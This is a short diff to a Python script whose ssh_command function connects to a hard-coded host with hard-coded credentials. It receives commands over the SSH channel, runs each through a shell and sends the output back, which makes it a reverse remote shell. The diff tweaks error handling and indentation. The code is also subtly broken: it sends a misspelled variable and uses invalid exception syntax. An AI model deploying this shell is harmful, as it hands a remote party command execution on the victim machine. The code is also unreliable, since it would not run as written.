@@ -13,13 +13,13 @@ def ssh_command(ip,user,passwd,command):
         while True:
             command = sshsession.recv(1024)
             try:
-                cmd_output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
+                cmd_output = subprocess.check_output(command,shell=True)
                 sshsession.send(cmd_ouput)
             except e:
                 sshsession.send(str(e))
 
         sessionclient.close()
-        return 
+    return 
 
 
 ssh_command("192.168.1.106",'terry','123456','ClientConnected')
